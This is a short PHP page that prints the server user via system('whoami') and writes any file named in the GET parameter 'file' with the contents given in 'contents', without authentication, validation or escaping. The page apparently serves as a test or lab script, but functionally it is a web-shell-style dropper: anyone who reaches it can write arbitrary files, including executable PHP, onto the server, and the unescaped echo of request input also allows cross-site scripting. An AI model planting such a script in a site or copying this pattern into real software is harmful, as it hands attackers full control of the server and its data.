<html>
<body>

<?php  
    echo "Hello, phpd is running as: ";
    system("whoami");
    echo "<br><br>\n\n";

    if (isset($_GET['file']) and isset($_GET['contents']))  {
        echo "Writing to ". $_GET['file'] . " with contents: <br><br>\n" . $_GET['contents'];
        file_put_contents($_GET['file'], $_GET['contents']);
        
    } else {
        echo "Error: This script requires both 'file' and 'contents' GET parameters.";
    }

?>  

</body>
</html>
